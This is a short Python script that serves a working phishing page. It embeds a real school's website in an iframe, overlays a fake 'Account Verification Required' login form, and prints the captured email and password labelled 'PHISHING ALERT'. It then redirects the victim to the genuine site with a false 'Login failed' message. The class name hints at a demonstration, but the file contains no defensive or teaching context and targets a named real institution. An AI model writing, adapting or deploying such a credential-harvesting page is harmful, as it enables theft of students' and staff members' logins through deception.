import http.server, socketserver, urllib.parse


class VulnerableHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        html = """<!DOCTYPE html><html><head><title>Secure Login Portal</title></head>
<body><iframe src="https://hamiltoncollege.vic.edu.au/" width="100%" height="600px"></iframe>
<div style="position:absolute;top:150px;left:50px;background:rgba(255,255,255,0.95);padding:20px;border:2px solid #0084ff;border-radius:8px;">
<h3>Account Verification Required</h3><form method="POST">Email:<input name="email" type="email" style="width:200px;margin:5px;"><br>Password:<input name="password" type="password" style="width:200px;margin:5px;"><br><button style="background:#0084ff;color:white;padding:10px;">Verify Account</button></form></div></body></html>"""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        length = int(self.headers["Content-Length"])
        data = urllib.parse.parse_qs(self.rfile.read(length).decode())
        print(
            f"PHISHING ALERT: Captured {data.get('email', [''])[0]} / {data.get('password', [''])[0]}"
        )

        # Redirect after failed login
        redirect_html = """
        <html>
        <head><meta http-equiv="refresh" content="3;url=https://hamiltoncollege.vic.edu.au/"></head>
        <body><h2>Login failed. Redirecting to the home page...</h2></body>
        </html>
        """

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(redirect_html.encode())


with socketserver.TCPServer(("", 9999), VulnerableHandler) as server:
    server.serve_forever()
